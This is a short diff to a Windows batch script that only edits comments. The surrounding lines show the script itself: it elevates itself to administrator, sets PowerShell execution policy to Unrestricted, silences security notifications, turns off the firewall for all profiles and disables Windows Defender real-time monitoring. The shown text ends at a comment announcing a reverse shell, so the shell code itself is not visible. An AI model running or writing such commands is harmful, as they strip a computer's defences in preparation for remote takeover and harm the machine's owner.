@@ -8,6 +8,7 @@ cd /d "%~dp0" && ( if exist "%temp%\getadmin.vbs" del "%temp%\getadmin.vbs" ) &&
 for /f "tokens=3 delims=\" %%a in ("!cd!") do set "username=%%a"
 cd /d "C:\Users\%username%\AppData\Local\Temp"
 
+:: remove powershell script restrictions
 powershell -command "Set-ExecutionPolicy Unrestricted -Force"
 
 :: disable windows security notifications
@@ -16,7 +17,7 @@ reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notif
 :: disable firewall
 netsh advfirewall set allprofiles state off >nul 2>&1
 
-:: disable windefend
+:: disable windows defender
 powershell -command "Set-MpPreference -DisableRealtimeMonitoring $true"
 
 :: set up reverse shell
